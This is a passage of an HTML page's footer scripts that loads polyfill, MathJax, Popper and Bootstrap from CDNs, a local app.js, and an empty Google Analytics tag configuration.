src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
